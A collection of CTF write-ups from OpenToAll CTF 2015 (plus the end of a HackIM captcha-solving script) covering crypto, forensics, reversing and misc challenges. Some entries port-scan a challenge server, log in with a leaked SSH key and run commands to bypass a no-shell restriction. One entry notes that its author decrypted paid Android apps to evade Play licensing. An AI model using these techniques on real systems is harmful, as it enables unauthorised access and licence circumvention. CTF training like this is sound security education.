        # verify my guess
        r = s.post(VERIFY_URL, data={'solution': guess})
        # diagnostic info
        print r.content
        print 'my guess was: %s' % guess
~~~

The flag shows up after we solved ~40 captchas in 120 seconds.

`flag{H@CKIM_C@pTcha!09022015}`

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-web-500/>
* <https://github.com/S42X/CTF/blob/master/HACKIM/captcha.md>
* <http://garage4hackers.com/entry.php?b=3103>
* <http://piggybird.net/2015/01/hackim-2015-web-question-5-500-points/>
* [Spanish](https://blog.ka0labs.net/post/20/)
* <https://gist.github.com/pich4ya/4cbfb645b29d75a81d3f>
* <http://pastebin.com/juq973EU>
# OpenToAll CTF 2015: bach

**Category:** Crypto
**Points:** 150
**Solves:** 46
**Author:** Eriner
**Description:** 

> Well, not quite...
> 
> Note: the format is flag{secret goes here}
> 
> [8aec78b8dca5541b69d07404f1a6be68.tar.bz2](8aec78b8dca5541b69d07404f1a6be68.tar.bz2)

## Write-up

by [polym](https://github.com/abpolym)

We are given a picture of a play with several notes.

Googling `Bach crypto` leads us to the Wikipedia entry for [Musical Cryptograms](http://en.wikipedia.org/wiki/Musical_cryptogram).

There, we see that the alphabet is encoded into different notes and their [accidentals](http://en.wikipedia.org/wiki/Accidental_%28music%29) natural (♮), sharp (♯) and flat (♭).

After some fiddling, we see that the decryption key is as follows:

```
- A B C D E F G
♯ H I J K L M N
♮ O P Q R S T U
♭ V W X Y Z
```

A similar example is <http://myplace.frontier.com/~evaew/wilkinsworks/NA_example_2.html>, which is more explained [here](http://myplace.frontier.com/~evaew/wilkinsworks/NoteAlpha.html)

The flag is `flag{erinersmusicalmasterpiece}`.

## Other write-ups and resources

* none yet# OpenToAll CTF 2015: Egregiously Catastrophic Bifurcation

**Category:** Crypto
**Points:** 250
**Solves:** 15
**Author:** gaffe
**Description:** 

> 104.131.107.153:12734
>
> Hint: Added, look in the challenge description.

## Write-up

(TODO)

## Other write-ups and resources

* [Original source and writeup](https://github.com/gaffe23/gaffe-ota2/tree/master/egregiously-catastrophic-bifurcation)
# OpenToAll CTF 2015: Enigma

**Category:** Crypto
**Points:** 250
**Solves:** 13
**Author:** Eriner
**Description:** 

> Alan Turing did it, can you?
> 
> TBVF{NPDGWZ_MRK_ASZKIT_ZFPBL_LZEDAJ_SHAX_CDK_BOQOJ_LL_KWINUPOW_X_LYUWFYSS_YGZTBQ_XHKGRAI}
> 
> ===== Update, New Description =====
>
> New Flag and description:
>
> WMJD{QJDWGQ_IRW_QSZWUT_ZPFBX_XZBFUB_SHAB_CDW_QPNGV_XQ_NKPQIFGK_L_XYQEPYJS_YBGNBN_LHWOZAU}
>
> Note: There are 3 plugboard connections

## Write-up

(TODO)

## Other write-ups and resources

* [Writeup by Ymgve](https://privatepaste.com/f6ea545d19)# OpenToAll CTF 2015: Catz

**Category:** Forensics
**Points:** 100
**Solves:** 120
**Author:** Eriner
**Description:** 

> I have some pictures of catz on my drive! I also had a sensitive file on there, but even after it was deleted, it was still there! I took some extra precautions to prevent prying eyes...
> 
> [http://public.givemesecurity.info/d17c5ed999bc505ec80e64c714c6d965.tar.bz2](d17c5ed999bc505ec80e64c714c6d965.tar.bz2)

## Write-up

by [c0riolis](https://github.com/c0riolis)

In this challenge we are given a bzip2 file. After extracting it, we get an ext4 filesystem.

```bash
$ tar -xvf d17c5ed999bc505ec80e64c714c6d965.tar.bz2 
catz.img
$ file catz.img 
catz.img: Linux rev 1.0 ext4 filesystem data, UUID=2d362e1b-69ae-4137-bdbb-4fde2775ac91 (extents) (huge files)
```

After mounting it, the only thing we have is some pictures of cats. Unfortunately, none of them gives us the flag. Let's check if we can recover some deleted files with extundelete.

```bash
$ extundelete --restore-all catz.img
NOTICE: Extended attributes are not restored.
Loading filesystem metadata ... 2 groups loaded.
Loading journal descriptors ... 146 descriptors loaded.
Searching for recoverable inodes in directory / ... 
2 recoverable inodes found.
Looking through the directory structure for deleted files ... 
1 recoverable inodes still lost.
$ ls -Alh RECOVERED_FILES 
total 16K
-rw-r--r-- 1 coriolis coriolis  54 Mar  9 16:52 .cat.jpg
-rw-r--r-- 1 coriolis coriolis 12K Mar  9 16:52 file.17
```

So we recovered two files and checking their content gives us the flag :).

```bash
$ cat RECOVERED_FILES/.cat.jpg 
flag{fugly_cats_need_luv_2}
```

## Other write-ups and resources

* <http://team-jihfu.github.io/2015/03/09/otactf2-2015-catz-forensics-100/>
* <http://www.xenocidewiki.net/blog/ota-ctf-2-2015-catz-writeup>
* <https://securimag.org/wp/challenges/opentoall-ctf-2015-forensics-write-up/>
# OpenToAll CTF 2015: Doggie

**Category:** Forensics
**Points:** 50
**Solves:** 49
**Author:** Eriner
**Description:** 

> woof!
> 
> [b927033257a4604c06e791619a4c0713.tar.bz2](b927033257a4604c06e791619a4c0713.tar.bz2)
>
> Hint: Did Eriner really make this challenge?
>
> Hint: It's not encoded.

## Write-up

by [polym](https://github.com/abpolym)

We are given a dog PNG picture.

Running `pngcheck` on the picture reveals that it is not a PNG, however:

```bash
$ pngcheck a038218191c05846099054a9f21ff22a.png
a038218191c05846099054a9f21ff22a.png  this is neither a PNG or JNG image nor a MNG stream
ERROR: a038218191c05846099054a9f21ff22a.png
```

It's actually a JPEG:

```bash
file a038218191c05846099054a9f21ff22a.png
a038218191c05846099054a9f21ff22a.png: JPEG image data, JFIF standard 1.01
```

We can't find anything interesting using `strings -a` or `binwalk`, so we run `exiftool` on the file to get the metadata of the JPEG:

```bash
$ exiftool a038218191c05846099054a9f21ff22a.png 
ExifTool Version Number         : 9.76
File Name                       : a038218191c05846099054a9f21ff22a.png
Directory                       : .
File Size                       : 790 kB
File Modification Date/Time     : 2015:02:27 11:43:41+01:00
File Access Date/Time           : 2015:03:09 11:16:02+01:00
File Inode Change Date/Time     : 2015:03:09 11:14:29+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 9.76
Author                          : 00ffb.01039.011a9.013e3.013e8.00ffb.01590.015cb.8a461.8a612.8a6f3.8a8a0.b24ce.b2663.b2751.b2663.a2a23.a2a37.a272d.a2742.6d677.57092.57357.36515.5d538
Image Width                     : 1944
Image Height                    : 2904
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1944x2904
```

We see a strange author and, after some time, see that these are specific hex positions in the JPEG that form the flag.

Extracting the flag is possible through a quick bash cmd:

```bash
$ exiftool a038218191c05846099054a9f21ff22a.png | grep --color=none Author | awk '{print $3}' | sed 's/\.//g' | grep --color=none -o "....." | while read p; do xxd "-s0x$p" -l1 -p a038218191c05846099054a9f21ff22a.png; done | xxd -r -p
flag{fck snow i has hat!}
```

## Other write-ups and resources

* <https://securimag.org/wp/challenges/opentoall-ctf-2015-forensics-write-up/>
# OpenToAll CTF 2015: Gone

**Category:** Forensics
**Points:** 200
**Solves:** 30
**Author:** Eriner
**Description:** 

> It seems that my files are gone!
> 
> [http://public.givemesecurity.info/gone.img.tar.bz2](gone.img.tar.bz2)

## Write-up

by [c0riolis](https://github.com/c0riolis)

We are given a bzip2 file. Let's extract it first.

```bash
$ tar -xvf gone.img.tar.bz2
1fdb86c25131bb3aa247bada29b29115.img
$ file 1fdb86c25131bb3aa247bada29b29115.img
1fdb86c25131bb3aa247bada29b29115.img: Linux rev 1.0 ext4 filesystem data, UUID=1385df22-b2ce-4b4f-858e-79ae1932ca1a (extents) (huge files)
```

So now we have an ext4 filesystem. However, if we mount it there is nothing inside.
Using extundelete on it reveal that the filesystem is corrupted.

```bash
$ extundelete 1fdb86c25131bb3aa247bada29b29115.img
No action specified; implying --superblock.
extundelete: The ext2 superblock is corrupt when trying to open filesystem 1fdb86c25131bb3aa247bada29b29115.img
```

Let's try to repair it using fsck:

```bash
$ fsck.ext4 1fdb86c25131bb3aa247bada29b29115.img
e2fsck 1.42.12 (29-Aug-2014)
ext2fs_open2: The ext2 superblock is corrupt
fsck.ext4: Superblock invalid, trying backup blocks...
1fdb86c25131bb3aa247bada29b29115.img was not cleanly unmounted, check forced.
Pass 1: Checking inodes, blocks, and sizes
Pass 2: Checking directory structure
Pass 3: Checking directory connectivity
Pass 4: Checking reference counts
Pass 5: Checking group summary information
Free blocks count wrong for group #0 (6789, counted=488).
Fix<y>? yes
Free blocks count wrong for group #1 (2006, counted=228).
Fix<y>? yes
Free blocks count wrong (8795, counted=716).
Fix<y>? yes
Free inodes count wrong for group #0 (1269, counted=1262).
Fix<y>? yes
Free inodes count wrong (2549, counted=2542).
Fix<y>? yes

1fdb86c25131bb3aa247bada29b29115.img: ***** FILE SYSTEM WAS MODIFIED *****
1fdb86c25131bb3aa247bada29b29115.img: 18/2560 files (11.1% non-contiguous), 9524/10240 blocks
```

Now if we mount it, we get some interesting files:

```bash
$ ls
AE5  file  fil.enc  lost+found  ran2  ran3  ran4  rand
$ binwalk fil.enc
Scan Time:     2015-03-09 15:35:08
Target File:   /tmp/wu/tmp/fil.enc
MD5 Checksum:  cb84f2cc7d776e83ebe0bd17efa163f4
Signatures:    328

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             OpenSSL encryption, salted, salt: 0x-6BC6193B4330E12E
$ cat AE5
4[71A3j9[\22?/+u0
```

The fil.enc file seems to be an openssl encrypted file according to binwalk while the AE5 file is clearly a hint about the encryption algorithm and probably the key. Decrypting it with various AES algorithms leads us to a valid png file :

```bash
$ openssl enc -d -aes-128-ctr -in fil.enc -out fil.out -kfile AE5 
$ file fil.out 
fil.out: PNG image data, 1300 x 1076, 8-bit/color RGBA, non-interlaced
```

Opening it gives us the flag:

![Decrypted file](fil.out)

```bash
flag : flag{ext_sooper_blocks_are_c00l}
```

## Other write-ups and resources

* <http://capturetheswag.blogspot.com.au/2015/03/opentoall-ctf2015-gone-forensics.html>
* <https://securimag.org/wp/challenges/opentoall-ctf-2015-forensics-write-up/>
# OpenToAll CTF 2015: Lost Flug

**Category:** Forensics
**Points:** 75
**Solves:** 88
**Author:** kee7a
**Description:** 

> [http://public.givemesecurity.info/cap.pcapng.zip](cap.pcapng.zip)

## Write-up

by [polym](https://github.com/abpolym)

We are given a pcapNG capture file with a bunch of UDP and TCP traffic.

When searching the file for usual keywords using `strings`, we see something interesting whilst `grep`ing looking for `password`:

```bash
$ strings -a cap.pcapng | igrep password
:rajaniemi.freenode.net 372 logman1337 :- including SSL traffic - has been sniffed and passwords
:rajaniemi.freenode.net 372 logman1337 :- password(s) to a new value which is not shared with any
:rajaniemi.freenode.net 372 logman1337 :- You can do this with /msg nickserv set password newpasshere
:rajaniemi.freenode.net 372 logman1337 :- passwords again after analysis has completed.
```

This is suspicious, so we look for `logman1337`'s activity:

```bash
$ strings -a cap.pcapng | igrep logman1337
arB=NICK logman1337
:rajaniemi.freenode.net 001 logman1337 :Welcome to the freenode Internet Relay Chat Network logman1337
:rajaniemi.freenode.net 002 logman1337 :Your host is rajaniemi.freenode.net[195.148.124.79/6665], running version ircd-seven-1.1.3
:rajaniemi.freenode.net 003 logman1337 :This server was created Tue Oct 21 2014 at 11:19:23 UTC
:rajaniemi.freenode.net 004 logman1337 rajaniemi.freenode.net ircd-seven-1.1.3 DOQRSZaghilopswz CFILMPQSbcefgijklmnopqrstvz bkloveqjfI
[...]
:rajaniemi.freenode.net 305 logman1337 :You are no longer marked as being away
ardC)oR1:logman1337!~logman@162.245.177.238 JOIN #XPvCxHRTCFKBBzyb
:rajaniemi.freenode.net 353 logman1337 @ #XPvCxHRTCFKBBzyb :logman1337 @kee7a
:rajaniemi.freenode.net 366 logman1337 #XPvCxHRTCFKBBzyb :End of /NAMES list.
)oS\":rajaniemi.freenode.net 352 logman1337 #XPvCxHRTCFKBBzyb ~logman 162.245.177.238 rajaniemi.freenode.net logman1337 H :0 logman
:rajaniemi.freenode.net 352 logman1337 #XPvCxHRTCFKBBzyb ~kee7a unaffiliated/kee7a kornbluth.freenode.net kee7a H@ :0 kee7a
:rajaniemi.freenode.net 315 logman1337 #XPvCxHRTCFKBBzyb :End of /WHO list.
```

He joined the channel `#XPvCxHRTCFKBBzyb` on `freenode.net`.

After joining the channel with the same username (no authentification as far as I know), we see a user named `flag{Us3EsS31}` using `\names` in IRC.

The flag is `flag{Us3EsS31}`

## Other write-ups and resources

* <https://securimag.org/wp/challenges/opentoall-ctf-2015-forensics-write-up/># OpenToAll CTF 2015: Android Oh No!

**Category:** Misc
**Points:** 150
**Solves:** 14
**Author:** Eriner
**Description:**

> It seems someone got a hold of my phone and deleted some important files, and now my phone won't boot! I had an important app on there, maybe you can get it working! Here is an image of my phone...
>
> [http://public.givemesecurity.info/16b11191c1410cb0184a6edd08e9105a.tar.gz](http://public.givemesecurity.info/OTACTF-2015/16b11191c1410cb0184a6edd08e9105a.tar.gz)
>
> Hint: I've encrypted my custom app so no one can find the secretz! Thankfully, I uninstalled it before someone hacked my phone! Trouble is, I can't install it on my new phone! Can you help?

[Alternative download](https://mega.nz/#!vA8yFSzS!GveYS_o5dtQ4gvHksT8_HYeAOVkN2Lx_nVTEZ75EVjY)

## Write-up

by [Eriner](https://github.com/Eriner) and Brehret N

This challenge revolves around finding an encrypted apk, and then decrypting it to get the flag. The first place many people likely checked was in the app folder, located at `mnt/android-4.4-r2/data/app`.
The app found here is titled: `net.opentoall.flag.flag-1.apk`. This app is a red herring, and upon opening the app, it shows a picture of a red fish and says "I'm here to distract you".
This app was to be ignored, and had no useful information. It wasn't the encrypted app the challenge described.
<br>
In the user storage directory, `mnt/android-4.4-r2/data/media/0` the file
 `encrypted.nothingtoseehere.apk` can be found.
<br>

A shortcut, in this case, would be to use `find` to remove the burden of manual search:
> ```
> shell@android ~/ # find mnt/ -type f -iname "*.apk"
> mnt/android-4.4-r2/data/data/com.google.android.gms/app_dg_cache/1B1C47D6957F9C3F15E0130296C46C62216574DA/the.apk
> mnt/android-4.4-r2/data/app/net.opentoall.flag.flag-1.apk
> mnt/android-4.4-r2/data/media/0/encrypted.nothingtoseehere.apk
> mnt/android-4.4-r2/data/media/0/Download/flag.apk
> ```

Or,

```
shell@android ~/mnt/android-4.4-r2/data/media/0 # file encrypted.nothingtoseehere.apk
encrypted.nothingtoseehere.apk: data
```
<br>
It showing 'data' likely means that it is encrypted, as no known headers or magic numbers were found. Doing some searches, you may have found this:
http://nelenkov.blogspot.com/2012/07/using-app-encryption-in-jelly-bean.html
There are a few books about Android JB app encryption (i.e. "Android Security Internals") worth checking out.

<br>
The most important piece of information to glean from this page is:
<br>

> The --algo, --key and --iv parameters obviously have to do with encrypted apps, so before going into details lets first try to install an encrypted APK. Encrypting a file is quite easy to do using the enc OpenSSL commands, usually already installed on most Linux systems. We'll use AES in CBC mode with a 128 bit key (a not very secure one, as you can see below), and specify an initialization vector (IV) which is the same as the key to make things simpler:

> ` $ openssl enc -aes-128-cbc -K 000102030405060708090A0B0C0D0E0F -iv 000102030405060708090A0B0C0D0E0F -in my-app.apk -out my-app-enc.apk `
>

Basically, this particular APK has been encrypted _manually_ and doesn't follow the twofish encryption Google Play uses when it encrypts the dmcrypt app-asec files. But you need a key! In the same blog post,

> Both are unchanged from the original Froyo apps-to-SD implementation: Twofish with a 128-bit key stored in /data/misc/systemkeys:

> ```
> shell@android:/data/misc/systemkeys # ls
> ls
> AppsOnSD.sks
> shell@android:/data/misc/systemkeys # od -t x1 AppsOnSD.sks
> od -t x1 AppsOnSD.sks
> 0000000 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f
> 0000020
> ```

As it says, the original android app encryption/decryption process uses twofish, but there is more than one way to encrypt and install apps on android. In this challenge, the encryption is done manually using openssl.

Using the keyfile mentioned above (without spaces), decrypt the `encrypted.nothingtoseehere.apk`:

> ```
> shell@android # openssl aes-128-cbc -d -K aa7db8864627354c7a4b0fbd81f2f399 -iv 000102030405060708090A0B0C0D0E0F -in encrypted.nothingtoseehere.apk -out decrypted.nothingtoseehere.apk
> ```

From here, grep/install to get the flag.
<br>
## Notes from the author:
<br>
This challenge was orignally created out of spite. When I had moved my personal phone from 4.4.4 to 5.0, I decided not to install Gapps, and couldn't get any of my paid applications that I relied upon. I decided to research how Google encrypts the apps so I could decrypt the apps I paid for and continue to use them. After asking people to read my blog post, no one did. So, I decided to make a challenge revolving around the subject.
Blog post can be found here (I hid it during the competition): http://givemesecurity.info/2015/01/05/copying-apps-after-software-upgrade-without-google-play/
<br>
## Hindsight:
<br>
I originally used twofish encryption on the apk and placed it in the app-asec directory, but I was unable to mirror the same implementation Google uses with their encrypted apps, so I decided to change the challenge so something slightly more obscure. In hindsight, the challenge may have been more 'correct' if I had just accepted my imperfection in mirroring Google and just left it as twofish in app-asec, as it may have lead to faster solves.


## Other write-ups and resources

* none yet
# OpenToAll CTF 2015: Math Is Hard

**Category:** Misc
**Points:** 200
**Solves:** 110
**Author:** gaffe
**Description:**

> 104.131.107.153:12121

## Write-up

by [c0riolis](https://github.com/c0riolis)

This challenge was in 3 steps:
* Compute a sum
* Solve an equation
* Compute the value of the derivated of the given function at a specific point

Each of these steps had to be done 8 times.

Let's begin by making a function for the first step. Since it's always a sum between 2 numbers, we can just extract the two numbers and naively compute the sum.

```python
def calc(s):
    data = s.recv(4096).decode().split()[-3:] # Extract the calc datas
    nb1 = int(data[0])
    nb2 = int(data[2])
    res = str(nb1 + nb2)
    s.send(res.encode())
```

For the second step we'll just use a module: numpy which already implement linear equation solving.
for two equations:

* a*x + b*y = c
* a'*x' + b'*y' = c'

With a, a', b, b', c, c' constants and x, y undefined values, we can use numpy to get the solution tuple (x, y) like this:

```python
import numpy

A = numpy.array([[a, b], [a', b']])
B = numpy.array([c], [c'])
r = numpy.linalg.solve(A, B)
```

Applying it to our case:

```python
def equation(s):
    data = s.recv(4096).decode()
    # Extract the equations
    eq1, eq2 = tuple(data.split('\n')[-4:-2])
    eq1, eq2 = eq1.split(), eq2.split()
    # Extract equations members
    eq1x, eq1y, eq1z = int(eq1[0][:-1]), int(eq1[2][:-1]), int(eq1[4])
    eq2x, eq2y, eq2z = int(eq2[0][:-1]), int(eq2[2][:-1]), int(eq2[4])
    # Solve with numpy
    a = numpy.array([[eq1x, eq1y], [eq2x, eq2y]])
    b = numpy.array([[eq1z], [eq2z]])
    res = numpy.linalg.solve(a, b)
    x = str(res[0])[1:-2]
    y = str(res[1])[1:-2]
    s.send(x.encode())
    s.send(y.encode())
```

Finally, the third part which seems to be the harder part is in fact really simple since the only functions we get are sums of constants or functions of the form :

> f(x) = a*x^b

Since constants are nullified by the derivation and the derivation of these functions is:

> f'(x) = a*b*x^(b - 1)

It allows us to implement a naive algorithm by just ignoring constant values and extracting values from the function to compute the derivated value at the given point.

```python
def derivation(s):
    data = s.recv(4096).decode().split('\n')
    pt = int(data[-4][-2:-1]) # Extract the point value
    fs = data[-3][7:].split() # Extract the function
    fs = [x for x in fs if 'x' in x] # Ignore constants
    a = int(f[0])
    b = int(f[-1])
    res = sum([a * b * pow(pt, b - 1) for f in fs]) # Compute derivated value
    s.send(str(res).encode())
```

Putting all these functions together with some loops and a nice socket we get:

[script.py](script.py)

And the flag:
> flag{l3ts_g0_shOpP1ng}

## Other write-ups and resources

* [Original source and writeup](https://github.com/gaffe23/gaffe-ota2/tree/master/math-is-hard)
* [French](https://securimag.org/wp/challenges/opentoall-ctf-math-is-hard/)
# OpenToAll CTF 2015: Secure Server

**Category:** Misc
**Points:** 75
**Solves:** 150
**Author:** kee7a
**Description:** 

> this server is hacker proof... i think.
> 
> 104.131.124.226
>
> Hint: You do not need to bruteforce anything
>
> Hint: The challenge has been tweaked to be less confusing

## Write-up

by [polym](https://github.com/abpolym)

When running `nmap -p0-65535 -T5 104.131.124.226`, wee see that there are two public services running:

```bash
$ nmap -p0-65535 -T5 104.131.124.226
Starting Nmap 6.47 ( http://nmap.org ) at 2015-03-06 14:12 CET
Warning: 104.131.124.226 giving up on port because retransmission cap hit (2).
Strange error from connect (49):Can\'t assign requested address
Nmap scan report for 104.131.124.226
Host is up (0.10s latency).
Not shown: 64610 closed ports, 924 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 271.32 seconds
```

The two services is a [simple http server](./104.131.124.226:8080/index.html) that does not reveal any further information and a SSH service, which we don't have the username+password or username+sshkey information for. Bruteforcing is not a solution according to the task authors (see hint).

So we look for common files that can be accessed on the http server, such as `.htaccess`, `index.html~` or `robots.txt` etc.

We see a `robots.txt` file that gives us another directory to search for any hidden information, `/secret`.

Inside `http://104.131.124.226:8080/secret`, we find a [secret.zip](./104.131.124.226\:8080/secret/secret.zip) file that we download and extract:

```bash
$ unzip secret.zip && tree -a
├── __MACOSX
│   ├── ._secret
│   └── secret
│       ├── ._SECRETobservation15september11Rhodes, Greece.jpg
│       ├── ._observation 19november32013.jpg
[...]
│       └── ._observation9december52010.jpg
├── secret
│   ├── .ssh
│   │   ├── key
│   │   └── key.pub
│   ├── SECRETobservation15september11Rhodes, Greece.jpg
│   ├── observation 19november32013.jpg
[...]
│   └── observation9december52010.jpg
└── secret.zip
```

We don't see anything useful in the pictures, which are showing snakes with hats, presumably from [/r/snakeswithhats](http://www.reddit.com/r/SnakesWithHats/) or in the `\_\_MACOSX` folder, so we use the sshkey `key` in the `secret/.ssh` folder and test several usernames, such as `snake`, `root`, `user`, `secret` etc.

We can connect using the username `secret`, but are disconnected immediately:

```bash
$ ssh -i key secret@104.131.124.226
Linux OTAMISC 3.2.0-4-amd64 #1 SMP Debian 3.2.65-1+deb7u1 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: XXX
hello, welcome to my secret server
I thought somone may try to break into my server so i setup some extra protection
i dont want to give you a shell, but here is some ascii art for you:
Connection to 104.131.124.226 closed.
```

So the author does not want to give us a shell and setup some extra protection to do so (e.g. setting the default user shell to /bin/false).

However, we can execute commandos using `ssh` itself and see several [different responses](asciiart) for each connection until finally a ascii-flag with a link appears:

```bash
$ ssh -i key secret@104.131.124.226 'echo'
hello, welcome to my secret server
I thought somone may try to break into my server so i setup some extra protection
i dont want to give you a shell, but here is some ascii art for you:
http://cl.ly/image/2c2a3O1T3q3j
[ascii-flag]
```

The link is a picture containing the flag:

![](putthebinthec.jpg)

The flag is `flag{pUttHeBintheC}`.

## Other write-ups and resources

* <http://team-jihfu.github.io/2015/03/09/otactf2-2015-secure-server-misc-75/>
# OpenToAll CTF 2015: TF2

**Category:** Misc
**Points:** 100
**Solves:** 82
**Author:** Eriner
**Description:** 

> Eriner loves playing tf2.
>
> You cannot guess the flag You do not need TF2, Steam, or a Steam Account to solve this challenge.
>
> Hint: Eriner has a very custom Soldier playstyle.

## Write-up

by [polym](https://github.com/abpolym)

We search for Eriner and OpenToAll and find [his Steam profile](http://steamcommunity.com/id/eriner) on [a personal website of his](http://givemesecurity.info/about/).

After that, we have a look at [his inventory](http://steamcommunity.com/id/Eriner/inventory/), especially his TF2 inventory, and search for the keyword `flag`.

We see an item listed under a customized name, which is also the flag:

![](screen.png)

The flag is `flag{Black_Box_White_Hat}`.

## Other write-ups and resources

* none yet# OpenToAll CTF write-ups

* <http://ctf2.opentoall.net/>
* [Scoreboard](http://ctf2.opentoall.net/scoreboard) or [here](scoreboard.txt)
* [Number of solves per task](solve_stats.txt)

## Completed write-ups

* [crypto/bach](crypto/bach)
* [forensics/catz](forensics/catz)
* [forensics/doggie](forensics/doggie)
* [forensics/gone](forensics/gone)
* [forensics/lost_flug](forensics/lost_flug)
* [misc/android-oh-no](misc/android-oh-no)
* [misc/math-is-hard](misc/math-is-hard)
* [misc/secure-server](misc/secure-server)
* [misc/tf2](misc/tf2)
* [reverse/capture-the-bool](reverse/capture-the-bool)
* [reverse/static](reverse/static)
* [reverse/switchy](reverse/switchy)
* [trivia/classic](trivia/classic)
* [trivia/irc](trivia/irc)
* [trivia/opcode](trivia/opcode)
* [trivia/ZmxhZ3tiYXNlNjRfaXNfaGFyZF9odWh9Cg==](trivia/ZmxhZ3tiYXNlNjRfaXNfaGFyZF9odWh9Cg==)

## External write-ups only

* [crypto/egregiously-catastrophic-bifurcation](crypto/egregiously-catastrophic-bifurcation)
* [crypto/enigma](crypto/enigma)
* [reverse/advanced-risque-machine](reverse/advanced-risque-machine)

## Missing write-ups# OpenToAll CTF 2015: Advanced Risqué Machine

**Category:** Reverse
**Points:** 500
**Solves:** 37
**Author:** gaffe
**Description:** 

> [d2a69a2919754e9c9d0f2aa16b2d07d0.tar.bz2](d2a69a2919754e9c9d0f2aa16b2d07d0.tar.bz2)

## Write-up

(TODO)

## Other write-ups and resources

* [Original source and writeup](https://github.com/gaffe23/gaffe-ota2/tree/master/advanced-risqu%C3%A9-machine)
# OpenToAll CTF 2015: Capture The Bool

**Category:** Reverse
**Points:** 50
**Solves:** 112
**Author:** xenocidewiki
**Description:** 

> [CaptureTheBool.exe](CaptureTheBool.exe)

## Write-up

by [polym](https://github.com/abpolym)

After finding nothing particular with `strings`, we open the file with a Hexeditor, `hexedit`, and look for something valuable.

We are lucky and find the flag by searching <kbd>/</kbd> for `{`:

![](flag.png)

The flag is `flag{J4V4_1S_S3XY_<3}`.

## Other write-ups and resources

* <http://www.xenocidewiki.net/blog/ota-ctf-2-2015-capture-the-bool-writeup># OpenToAll CTF 2015: Static

**Category:** Reverse
**Points:** 550
**Solves:** 52
**Author:** Togusa
**Description:** 

> [http://public.givemesecurity.info/static.zip](static.zip)
> 
> NOTE: THIS FLAG DOES NOT FOLLOW THE NORMAL FLAG FORMAT ( flag{secret} )

## Write-up

by [0x2Adr1](https://github.com/0x2Adr1) and Brehret N

We are given a Windows PE32 binary.

We open IDA and look for interesting strings.

We have a nice one : **.rdata:00404218 Nice! The password seems to
be OK!**

We find that the string is used in sub\_401ECE.

![function sub\_401ece](ida_sub_401ece.jpg)

At *0x401EF2* we have the instruction `test eax, eax` which checks if eax is greater or less than, or equal to 0.

If `eax` equals zero the program opens a MessageBox to tell us that the
password is correct. If not, then the program makes a simple jump to address `loc_401F07` and exits.

So, our goal is clear: how to make `eax` equals to zero?
`eax` contains the return value of the function called two instructions before.

`0x401EEF: call eax`

Just before we see a `mov eax, dword_40509C`. So we know that the interesting
function's address is at *0x40509C*.

Unfortunately when we look at *0x40509C*, we only see null bytes.

But it's not a problem since we can look at xrefs and find a `mov [0x40509C],
0x4015A8` instruction at *0x402802*.

Now, we know that the interesting function is sub\_4015A8, we look at it with
IDA and find that each byte of argv[1] is compared to a 14 chars buffer
**AfkYa3kApyA34h** xored with 14 bytes :
`0x71,0x16,0x58,0x37,0x4C,0x47,0x5B,0x1E,0x11,0x15,0x0D,0x6C,0x6B,0x37`.

It it matches, the function returns 0.

The flag is `flag{0p3n-t0_alL___}`

## Other write-ups and resources

* none yet
# OpenToAll CTF 2015: Switchy

**Category:** Reverse
**Points:** 150
**Solves:** 57
**Author:** gaffe
**Description:**

> [639c6e1ff3e75935601984458f5309f4.tar.bz2](639c6e1ff3e75935601984458f5309f4.tar.bz2)

## Write-up

by [c0riolis](https://github.com/c0riolis) and Brehret N

Opening the binary in IDA, we can see 3 particular assembly parts in the `main` function:

* The red one which is the prologue. Basically it saves the frame pointer, changes the stack pointer and allocates some space for the function.
* The green one which is in fact doing the same thing as the blue part but in a different way.
* The blue one whose pattern is then repeated about 30 times with different values.

![IDA View 1](idaview1.png)

Let’s focus on what the green block is doing. Here I highlighted the parts which are changing each time the pattern is repeated:

![IDA View 2](idaview2.png)

While second and third ones are just saving values which are never reused, the first one is a lot more interesting since some data contained as an immediate double word moves to `ecx` register, which is then moved on the stack on the next instruction. We’ll come back to these data later.

We can see that function, `sub_8048470`, is then called and probably takes the data previously moved onto the stack as argument.

The remaining instructions of the block (post-`lea`) just prints the result of the previously called function as a character on stdout and then flushes stdout. The blue block is as a result equivalent to the following C code.

> ```
> printf("%c", sub_8048470(dword_804B058));
> fflush(stdout);
> ```

Now let's take a look at the `sub_8048470` function:

![IDA View 3](idaview3.png)

The first block is basically just saving the argument in `var_10` and jumping on `loc_80486BB` if the argument was above `0x14` (which is never the case we’ll see that later). Grey parts are useless since it just save values that are never reused. Since the jump is never triggered, the next instructions are:

![IDA View 4](idaview4.png)

This block is jumping on an offset from the offset array `off_8048F50` using `var_10 * 4` as index.

Here is the offset array:

![IDA View 5](idaview5.png)

All the offsets in `off_8048F50` lead us to the same pattern:

![IDA View 6](idaview6.png)

This is basically xoring two values and returning the result. A quick look on the values in the different blocks shows us that only the first value is always ASCII characters. By the way, these ASCII characters are:

> ```
> "o gpcuabefihjmlnstw{}"
> ```

Since we can make `flag{...}` with all these letters, let’s extract them in the same order the program does with a simple IDA Python script.

> ```
> from idaapi import get_byte, get_long

> # Bytes offsets used as index in main function
> b = [0x804B050, 0x804B058, 0x804B060, 0x804B068, 0x804B070, 0x804B078,
>      0x804B080, 0x804B088, 0x804B090, 0x804B098, 0x804B0A0, 0x804B0A8,
>      0x804B0B0, 0x804B0B8, 0x804B0C0, 0x804B0C8, 0x804B0D0, 0x804B0D8,
>      0x804B168, 0x804B0E4, 0x804B16C, 0x804B0F0, 0x804B0F8, 0x804B170,
>      0x804B104, 0x804B174, 0x804B110, 0x804B118, 0x804B178, 0x804B124,
>      0x804B12C, 0x804B134, 0x804B13C, 0x804B144]
> # Blocks offsets used to xor values
